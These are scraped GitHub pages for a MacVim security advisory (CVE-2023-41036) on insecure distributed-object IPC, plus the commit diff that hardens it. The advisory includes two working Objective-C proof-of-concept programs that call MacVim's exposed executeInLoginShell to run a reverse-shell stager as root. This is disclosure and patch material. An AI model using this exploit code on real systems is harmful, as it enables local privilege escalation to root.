=== Content from github.com_0f239dc2_20250115_095935.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmacvim-dev%2Fmacvim%2Fsecurity%2Fadvisories%2FGHSA-9jgj-jfwg-99fv)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmacvim-dev%2Fmacvim%2Fsecurity%2Fadvisories%2FGHSA-9jgj-jfwg-99fv)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=macvim-dev%2Fmacvim)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[macvim-dev](/macvim-dev)
/
**[macvim](/macvim-dev/macvim)**
Public

* [Notifications](/login?return_to=%2Fmacvim-dev%2Fmacvim) You must be signed in to change notification settings
* [Fork
  682](/login?return_to=%2Fmacvim-dev%2Fmacvim)
* [Star
   7.6k](/login?return_to=%2Fmacvim-dev%2Fmacvim)

* [Code](/macvim-dev/macvim)
* [Issues
  172](/macvim-dev/macvim/issues)
* [Pull requests
  7](/macvim-dev/macvim/pulls)
* [Discussions](/macvim-dev/macvim/discussions)
* [Actions](/macvim-dev/macvim/actions)
* [Wiki](/macvim-dev/macvim/wiki)
* [Security](/macvim-dev/macvim/security)
* [Insights](/macvim-dev/macvim/pulse)

Additional navigation options

* [Code](/macvim-dev/macvim)
* [Issues](/macvim-dev/macvim/issues)
* [Pull requests](/macvim-dev/macvim/pulls)
* [Discussions](/macvim-dev/macvim/discussions)
* [Actions](/macvim-dev/macvim/actions)
* [Wiki](/macvim-dev/macvim/wiki)
* [Security](/macvim-dev/macvim/security)
* [Insights](/macvim-dev/macvim/pulse)

# Insecure Usage of IPC Mechanisms

High

[ychin](/ychin)
published
GHSA-9jgj-jfwg-99fv
Sep 12, 2023

## Package

No package listed

## Affected versions

<= 177

## Patched versions

178

## Description

### Summary

Macvim makes use of an insecure IPC mechanism which could lead to a privilege escalation. Distributed objects are a concept introduced by Apple which allow one program to vend an interface to another program. What is not made clear in the documentation is that this service can vend this interface to **any** other program on the machine.

### Details

The two relevant source files are [MMAppController](https://github.com/macvim-dev/macvim/blob/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src/MacVim/MMAppController.h#L28) and [MMBackend](https://github.com/macvim-dev/macvim/blob/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src/MacVim/MMBackend.h)

Any method exposed via these interfaces are usable to any other process on the system. I have tested and confirmed that a malicious program use this as a privilege escalation vulnerability by polling if the MacVim is running as root. I did not attempt to interact with MMBackend, although based on the exposed methods something like a vim keylogger may be implemented using this interface.

### PoC

If you try to compile the POC using a newer version of XCode the NSConnection object that is used to call the vended interface will never successfully connect to anything. As such, I suggest cloning an older repo such as [JeremyAgost's IPC Demo](https://github.com/JeremyAgost/IPC-Demo) and modifying the main file there.

The following example can be used to execute a payload if MacVim was downloaded from <https://macvim.org/>:

```
#import <Foundation/Foundation.h>
#import "../IPCServ/ServiceObject.h"

#ifndef MAppController_h
#define MAppController_h
@interface MMAppController: NSObject
    - (int)executeInLoginShell:(NSString *)path arguments:(NSArray *)args;
@end

#endif /* MAppController_h */

int main(int argc, const char * argv[])
{

    @autoreleasepool {
        while(true){
            MMAppController * obj = (id)[NSConnection rootProxyForConnectionWithRegisteredName:@"/Applications/MacVim.app-connection" host:nil];

            if (obj) {
                NSArray *taskArgs = [NSArray arrayWithObjects: nil];
                int pid = [obj executeInLoginShell:@"/tmp/stager" arguments:taskArgs];

                [[(NSDistantObject *)obj connectionForProxy] invalidate];
                NSLog(@"yay");
            }
            else {
                NSLog(@"No Connection");
            }
            [NSThread sleepForTimeInterval:5.0f];

        }

    }
    return 0;
}
```

Note that in this case `/tmp/stager` was a payload which started a reverse shell if it was run as root via the IPC mechanism.

If macvim is installed via homebrew, the following was used:

```
#import <Foundation/Foundation.h>
#import "../IPCServ/ServiceObject.h"

#ifndef MAppController_h
#define MAppController_h
@interface MMAppController: NSObject
    - (int)executeInLoginShell:(NSString *)path arguments:(NSArray *)args;
@end

#endif /* MAppController_h */

int main(int argc, const char * argv[])
{

    @autoreleasepool {
        while(true){
            MMAppController * obj = (id)[NSConnection rootProxyForConnectionWithRegisteredName:@" /opt/homebrew/Cellar/macvim/9.0.1677/MacVim.app-connection" host:nil];

            if (obj) {
                NSArray *taskArgs = [NSArray arrayWithObjects: nil];
                int pid = [obj executeInLoginShell:@"/tmp/stager" arguments:taskArgs];

                [[(NSDistantObject *)obj connectionForProxy] invalidate];
                NSLog(@"yay");
            }
            else {
                NSLog(@"No Connection");
            }
            [NSThread sleepForTimeInterval:5.0f];

        }

    }
    return 0;
}
```
### Impact

The impact of exploitation is a privilege escalation to root - this is likely to affect anyone who is not careful about the software they download and use MacVim to edit files that would require root privileges. Although the MMBackend interface may be exploited in other ways, I did not explore this much further.

### Remedial

Afaik XPCConnection is the currently preferred mechanism; It has a robust mechanism for authentication of the calling process, however I'm not sure if it'll work in this specific case.

### Affected Versions

I had a quick glance at the repository history and I think this goes back as far as [2007](https://github.com/macvim-dev/macvim/commit/1e7199d3e5c70dc5a25c2e55b2041316fbb2c9bd). This would have been long before the interface was deprecated or some research around it was done by people such as project zero's Ian Beer.

### Final Notes

I'd like to thank the maintainers, specifically [@ychin](https://github.com/ychin) , for taking the time to talk to me and working on this project - the passion displayed by you guys is amazing :)

Finally, without the time and support given by my employer, [MWR CyberSec](https://www.mwrcybersec.com/), and colleagues; I would not have had the time to research or find this vulnerability.

### Severity

High

### CVE ID

CVE-2023-41036

### Weaknesses

No CWEs

### Credits

* [![@CDuPlooy](https://avatars.githubusercontent.com/u/13156302?s=40&v=4)](/CDuPlooy)
  [CDuPlooy](/CDuPlooy)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_d33b5824_20250115_095934.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmacvim-dev%2Fmacvim%2Fcommit%2F399b43e9e1dbf656a1780e87344f4d3c875e4cda)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmacvim-dev%2Fmacvim%2Fcommit%2F399b43e9e1dbf656a1780e87344f4d3c875e4cda)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=macvim-dev%2Fmacvim)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[macvim-dev](/macvim-dev)
/
**[macvim](/macvim-dev/macvim)**
Public

* [Notifications](/login?return_to=%2Fmacvim-dev%2Fmacvim) You must be signed in to change notification settings
* [Fork
  682](/login?return_to=%2Fmacvim-dev%2Fmacvim)
* [Star
   7.6k](/login?return_to=%2Fmacvim-dev%2Fmacvim)

* [Code](/macvim-dev/macvim)
* [Issues
  172](/macvim-dev/macvim/issues)
* [Pull requests
  7](/macvim-dev/macvim/pulls)
* [Discussions](/macvim-dev/macvim/discussions)
* [Actions](/macvim-dev/macvim/actions)
* [Wiki](/macvim-dev/macvim/wiki)
* [Security](/macvim-dev/macvim/security)
* [Insights](/macvim-dev/macvim/pulse)

Additional navigation options

* [Code](/macvim-dev/macvim)
* [Issues](/macvim-dev/macvim/issues)
* [Pull requests](/macvim-dev/macvim/pulls)
* [Discussions](/macvim-dev/macvim/discussions)
* [Actions](/macvim-dev/macvim/actions)
* [Wiki](/macvim-dev/macvim/wiki)
* [Security](/macvim-dev/macvim/security)
* [Insights](/macvim-dev/macvim/pulse)

## Commit

[Permalink](/macvim-dev/macvim/commit/399b43e9e1dbf656a1780e87344f4d3c875e4cda)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-9jgj-jfwg-99fv](https://github.com/macvim-dev/macvim/security/advisories/GHSA-9jgj-jfwg-99fv "GHSA-9jgj-jfwg-99fv")

[Browse files](/macvim-dev/macvim/tree/399b43e9e1dbf656a1780e87344f4d3c875e4cda)
Browse the repository at this point in the history

```
Harden NSConnection security in handling third-party connections
```

* Loading branch information

[![@ychin](https://avatars.githubusercontent.com/u/1217449?s=40&v=4)](/ychin)

[ychin](/macvim-dev/macvim/commits?author=ychin "View all commits by ychin")
authored
Sep 12, 2023

2 parents
[3927f58](/macvim-dev/macvim/commit/3927f58418d1cb523f4478cc4550122d3074a5ff)
+
[0380d81](/macvim-dev/macvim/commit/0380d81c3d2488bf0df9cfc1877005e1cdaa07bc)

commit 399b43e

 Show file tree

 Hide file tree

Showing
**6 changed files**
with
**53 additions**
and
**28 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src/MacVim

  + src/MacVim/MMAppController.m
    [MMAppController.m](#diff-b55aef929e3bb1c2068559ad029a6693c68de05ba5719f92b8abfcedb9920c2a)
  + src/MacVim/MMBackend.h
    [MMBackend.h](#diff-c337cb037ea318b10902e4ca5ed36d4e026a5138fa15564a4544e5128cf7d8cd)
  + src/MacVim/MMVimController.h
    [MMVimController.h](#diff-c964035c4667c79712852b63af8d77c923b704b88f409ab1a50a7aff72c4f3a1)
  + src/MacVim/MMVimController.m
    [MMVimController.m](#diff-a9d1ae114bc4ee7b95527853caf3c0cb1e72db0ea7294d405a61aebde928e0e1)
  + src/MacVim/MacVim.h
    [MacVim.h](#diff-aeb9e5f8e06d8cd652aeab7cc97189970f4434f5bf632338331b39412116a071)
  + MacVim.xcodeproj

    - src/MacVim/MacVim.xcodeproj/project.pbxproj
      [project.pbxproj](#diff-0ff510ea46bb007ac01a0e3491ea2a3f777d4fcb407def735bf2929f6feb2443)

## There are no files selected for viewing

36 changes: 26 additions & 10 deletions

36
[src/MacVim/MMAppController.m](#diff-b55aef929e3bb1c2068559ad029a6693c68de05ba5719f92b8abfcedb9920c2a "src/MacVim/MMAppController.m")

Show comments

[View file](/macvim-dev/macvim/blob/399b43e9e1dbf656a1780e87344f4d3c875e4cda/src/MacVim/MMAppController.m)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -304,7 +304,9 @@ - (id)init |
|  |  | // unlikely to fix it, we graciously give them the default connection.) |
|  |  | connection = [[NSConnection alloc] initWithReceivePort:[NSPort port] |
|  |  | sendPort:nil]; |
|  |  | [connection setRootObject:self]; |
|  |  | NSProtocolChecker \*rootObject = [NSProtocolChecker protocolCheckerWithTarget:self |
|  |  | protocol:@protocol(MMAppProtocol)]; |
|  |  | [connection setRootObject:rootObject]; |
|  |  | [connection setRequestTimeout:MMRequestTimeout]; |
|  |  | [connection setReplyTimeout:MMReplyTimeout]; |
|  |  |  |
| Expand All | | @@ -315,6 +317,20 @@ - (id)init |
|  |  | if (![connection registerName:name]) { |
|  |  | ASLogCrit(@"Failed to register connection with name '%@'", name); |
|  |  | [connection release]; connection = nil; |
|  |  |  |
|  |  | NSAlert \*alert = [[NSAlert alloc] init]; |
|  |  | [alert addButtonWithTitle:NSLocalizedString(@"OK", |
|  |  | @"Dialog button")]; |
|  |  | [alert setMessageText:NSLocalizedString(@"MacVim cannot be opened", |
|  |  | @"MacVim cannot be opened, title")]; |
|  |  | [alert setInformativeText:[NSString stringWithFormat:NSLocalizedString( |
|  |  | @"MacVim could not set up its connection. It's likely you already have MacVim opened elsewhere.", |
|  |  | @"MacVim already opened, text")]]; |
|  |  | [alert setAlertStyle:NSAlertStyleCritical]; |
|  |  | [alert runModal]; |
|  |  | [alert release]; |
|  |  |  |
|  |  | [[NSApplication sharedApplication] terminate:nil]; |
|  |  | } |
|  |  |  |
|  |  | // Register help search handler to support search Vim docs via the Help menu |
| Expand Down  Expand Up | | @@ -859,7 +875,7 @@ - (NSMenuItem \*)appMenuItemTemplate |
|  |  |  |
|  |  | - (void)removeVimController:(id)controller |
|  |  | { |
|  |  | ASLogDebug(@"Remove Vim controller pid=%d id=%d (processingFlag=%d)", |
|  |  | ASLogDebug(@"Remove Vim controller pid=%d id=%lu (processingFlag=%d)", |
|  |  | [controller pid], [controller vimControllerId], processingFlag); |
|  |  |  |
|  |  | NSUInteger idx = [vimControllers indexOfObject:controller]; |
| Expand Down  Expand Up | | @@ -1540,7 +1556,7 @@ - (MMVimController \*)keyVimController |
|  |  | return nil; |
|  |  | } |
|  |  |  |
|  |  | - (unsigned)connectBackend:(byref in id <MMBackendProtocol>)proxy pid:(int)pid |
|  |  | - (unsigned long)connectBackend:(byref in id <MMBackendProtocol>)proxy pid:(int)pid |
|  |  | { |
|  |  | ASLogDebug(@"pid=%d", pid); |
|  |  |  |
| Expand Down  Expand Up | | @@ -1570,21 +1586,21 @@ - (unsigned)connectBackend:(byref in id <MMBackendProtocol>)proxy pid:(int)pid |
|  |  | } |
|  |  |  |
|  |  | - (oneway void)processInput:(in bycopy NSArray \*)queue |
|  |  | forIdentifier:(unsigned)identifier |
|  |  | forIdentifier:(unsigned long)identifier |
|  |  | { |
|  |  | // NOTE: Input is not handled immediately since this is a distributed |
|  |  | // object call and as such can arrive at unpredictable times. Instead, |
|  |  | // queue the input and process it when the run loop is updated. |
|  |  |  |
|  |  | if (!(queue && identifier)) { |
|  |  | ASLogWarn(@"Bad input for identifier=%d", identifier); |
|  |  | ASLogWarn(@"Bad input for identifier=%lu", identifier); |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | ASLogDebug(@"QUEUE for identifier=%d: <<< %@>>>", identifier, |
|  |  | ASLogDebug(@"QUEUE for identifier=%lu: <<< %@>>>", identifier, |
|  |  | debugStringForMessageQueue(queue)); |
|  |  |  |
|  |  | NSNumber \*key = [NSNumber numberWithUnsignedInt:identifier]; |
|  |  | NSNumber \*key = [NSNumber numberWithUnsignedLong:identifier]; |
|  |  | NSArray \*q = [inputQueues objectForKey:key]; |
|  |  | if (q) { |
|  |  | q = [q arrayByAddingObjectsFromArray:queue]; |
| Expand Down  Expand Up | | @@ -2715,7 +2731,7 @@ - (void)processInputQueues:(id)sender |
|  |  | NSEnumerator \*e = [queues keyEnumerator]; |
|  |  | NSNumber \*key; |
|  |  | while ((key = [e nextObject])) { |
|  |  | unsigned ukey = [key unsignedIntValue]; |
|  |  | unsigned long ukey = [key unsignedLongValue]; |
|  |  | int i = 0, count = [vimControllers count]; |
|  |  | for (i = 0; i < count; ++i) { |
|  |  | MMVimController \*vc = [vimControllers objectAtIndex:i]; |
| Expand All | | @@ -2737,7 +2753,7 @@ - (void)processInputQueues:(id)sender |
|  |  | } |
|  |  |  |
|  |  | if (i == count) { |
|  |  | ASLogWarn(@"No Vim controller for identifier=%d", ukey); |
|  |  | ASLogWarn(@"No Vim controller for identifier=%lu", ukey); |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand All | | @@ -2758,7 +2774,7 @@ - (void)processInputQueues:(id)sender |
|  |  |  |
|  |  | - (void)addVimController:(MMVimController \*)vc |
|  |  | { |
|  |  | ASLogDebug(@"Add Vim controller pid=%d id=%d", |
|  |  | ASLogDebug(@"Add Vim controller pid=%d id=%lu", |
|  |  | [vc pid], [vc vimControllerId]); |
|  |  |  |
|  |  | int pid = [vc pid]; |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[src/MacVim/MMBackend.h](#diff-c337cb037ea318b10902e4ca5ed36d4e026a5138fa15564a4544e5128cf7d8cd "src/MacVim/MMBackend.h")

Show comments

[View file](/macvim-dev/macvim/blob/399b43e9e1dbf656a1780e87344f4d3c875e4cda/src/MacVim/MMBackend.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -21,7 +21,7 @@ |
|  |  | NSConnection \*connection; |
|  |  | NSConnection \*vimServerConnection; |
|  |  | id appProxy; |
|  |  | unsigned   identifier; |
|  |  | unsigned long identifier; |
|  |  | NSDictionary \*colorDict; |
|  |  | NSDictionary \*sysColorDict; |
|  |  | NSDictionary \*actionDict; |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[src/MacVim/MMVimController.h](#diff-c964035c4667c79712852b63af8d77c923b704b88f409ab1a50a7aff72c4f3a1 "src/MacVim/MMVimController.h")

Show comments

[View file](/macvim-dev/macvim/blob/399b43e9e1dbf656a1780e87344f4d3c875e4cda/src/MacVim/MMVimController.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -34,7 +34,7 @@ |
|  |  | #endif |
|  |  | > |
|  |  | { |
|  |  | unsigned   identifier; |
|  |  | unsigned long identifier; |
|  |  | BOOL isInitialized; |
|  |  | MMWindowController \*windowController; |
|  |  | id backendProxy; |
| Expand All | | @@ -58,7 +58,7 @@ |
|  |  |  |
|  |  | - (id)initWithBackend:(id)backend pid:(int)processIdentifier; |
|  |  | - (void)uninitialize; |
|  |  | - (unsigned)vimControllerId; |
|  |  | - (unsigned long)vimControllerId; |
|  |  | - (id)backendProxy; |
|  |  | - (int)pid; |
|  |  | - (void)setServerName:(NSString \*)name; |
| Expand Down | |  |

31 changes: 18 additions & 13 deletions

31
[src/MacVim/MMVimController.m](#diff-a9d1ae114bc4ee7b95527853caf3c0cb1e72db0ea7294d405a61aebde928e0e1 "src/MacVim/MMVimController.m")

Show comments

[View file](/macvim-dev/macvim/blob/399b43e9e1dbf656a1780e87344f4d3c875e4cda/src/MacVim/MMVimController.m)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -56,8 +56,6 @@ |
|  |  | // Timeout used for setDialogReturn:. |
|  |  | static NSTimeInterval MMSetDialogReturnTimeout = 1.0; |
|  |  |  |
|  |  | static unsigned identifierCounter = 1; |
|  |  |  |
|  |  | static BOOL isUnsafeMessage(int msgid); |
|  |  |  |
|  |  |  |
| Expand Down  Expand Up | | @@ -168,8 +166,15 @@ - (id)initWithBackend:(id)backend pid:(int)processIdentifier |
|  |  | if (!(self = [super init])) |
|  |  | return nil; |
|  |  |  |
|  |  | // TODO: Come up with a better way of creating an identifier. |
|  |  | identifier = identifierCounter++; |
|  |  | // Use a random identifier. Currently, MMBackend connects using a public |
|  |  | // NSConnection, which has security implications. Using random identifiers |
|  |  | // make it much harder for third-party attacker to spoof. |
|  |  | int secSuccess = SecRandomCopyBytes(kSecRandomDefault, sizeof(identifier), &identifier); |
|  |  | if (secSuccess != errSecSuccess) { |
|  |  | // Don't know what concrete reasons secure random would fail, but just |
|  |  | // as a failsafe, use a less secure option. |
|  |  | identifier = ((unsigned long)arc4random()) << 32 | (unsigned long)arc4random(); |
|  |  | } |
|  |  |  |
|  |  | windowController = |
|  |  | [[MMWindowController alloc] initWithVimController:self]; |
| Expand Down  Expand Up | | @@ -257,7 +262,7 @@ - (void)uninitialize |
|  |  | isInitialized = NO; |
|  |  | } |
|  |  |  |
|  |  | - (unsigned)vimControllerId |
|  |  | - (unsigned long)vimControllerId |
|  |  | { |
|  |  | return identifier; |
|  |  | } |
| Expand Down  Expand Up | | @@ -436,7 +441,7 @@ - (void)sendMessage:(int)msgid data:(NSData \*)data |
|  |  | [backendProxy processInput:msgid data:data]; |
|  |  | } |
|  |  | @catch (NSException \*ex) { |
|  |  | ASLogDebug(@"processInput:data: failed: pid=%d id=%d msg=%s reason=%@", |
|  |  | ASLogDebug(@"processInput:data: failed: pid=%d id=%lu msg=%s reason=%@", |
|  |  | pid, identifier, MMVimMsgIDStrings[msgid], ex); |
|  |  | } |
|  |  | } |
| Expand Down  Expand Up | | @@ -468,7 +473,7 @@ - (BOOL)sendMessageNow:(int)msgid data:(NSData \*)data |
|  |  | } |
|  |  | @catch (NSException \*ex) { |
|  |  | sendOk = NO; |
|  |  | ASLogDebug(@"processInput:data: failed: pid=%d id=%d msg=%s reason=%@", |
|  |  | ASLogDebug(@"processInput:data: failed: pid=%d id=%lu msg=%s reason=%@", |
|  |  | pid, identifier, MMVimMsgIDStrings[msgid], ex); |
|  |  | } |
|  |  | @finally { |
| Expand Down  Expand Up | | @@ -500,7 +505,7 @@ - (NSString \*)evaluateVimExpression:(NSString \*)expr |
|  |  | ASLogDebug(@"eval(%@)=%@", expr, eval); |
|  |  | } |
|  |  | @catch (NSException \*ex) { |
|  |  | ASLogDebug(@"evaluateExpression: failed: pid=%d id=%d reason=%@", |
|  |  | ASLogDebug(@"evaluateExpression: failed: pid=%d id=%lu reason=%@", |
|  |  | pid, identifier, ex); |
|  |  | } |
|  |  |  |
| Expand All | | @@ -517,7 +522,7 @@ - (id)evaluateVimExpressionCocoa:(NSString \*)expr |
|  |  | errorString:errstr]; |
|  |  | ASLogDebug(@"eval(%@)=%@", expr, eval); |
|  |  | } @catch (NSException \*ex) { |
|  |  | ASLogDebug(@"evaluateExpressionCocoa: failed: pid=%d id=%d reason=%@", |
|  |  | ASLogDebug(@"evaluateExpressionCocoa: failed: pid=%d id=%lu reason=%@", |
|  |  | pid, identifier, ex); |
|  |  | \*errstr = [ex reason]; |
|  |  | } |
| Expand Down  Expand Up | | @@ -556,7 +561,7 @@ - (void)processInputQueue:(NSArray \*)queue |
|  |  | [windowController processInputQueueDidFinish]; |
|  |  | } |
|  |  | @catch (NSException \*ex) { |
|  |  | ASLogDebug(@"Exception: pid=%d id=%d reason=%@", pid, identifier, ex); |
|  |  | ASLogDebug(@"Exception: pid=%d id=%lu reason=%@", pid, identifier, ex); |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -1275,7 +1280,7 @@ - (void)savePanelDidEnd:(NSSavePanel \*)panel code:(int)code |
|  |  | noteNewRecentFilePath:path]; |
|  |  | } |
|  |  | @catch (NSException \*ex) { |
|  |  | ASLogDebug(@"Exception: pid=%d id=%d reason=%@", pid, identifier, ex); |
|  |  | ASLogDebug(@"Exception: pid=%d id=%lu reason=%@", pid, identifier, ex); |
|  |  | } |
|  |  | @finally { |
|  |  | [conn setRequestTimeout:oldTimeout]; |
| Expand Down  Expand Up | | @@ -1308,7 +1313,7 @@ - (void)alertDidEnd:(MMAlert \*)alert code:(int)code context:(void \*)context |
|  |  | [backendProxy setDialogReturn:ret]; |
|  |  | } |
|  |  | @catch (NSException \*ex) { |
|  |  | ASLogDebug(@"setDialogReturn: failed: pid=%d id=%d reason=%@", |
|  |  | ASLogDebug(@"setDialogReturn: failed: pid=%d id=%lu reason=%@", |
|  |  | pid, identifier, ex); |
|  |  | } |
|  |  | } |
| Expand Down  Expand Up | | @@ -2089,7 +2094,7 @@ - (void)connectionDidDie:(NSNotification \*)notification |
|  |  |  |
|  |  | - (void)scheduleClose |
|  |  | { |
|  |  | ASLogDebug(@"pid=%d id=%d", pid, identifier); |
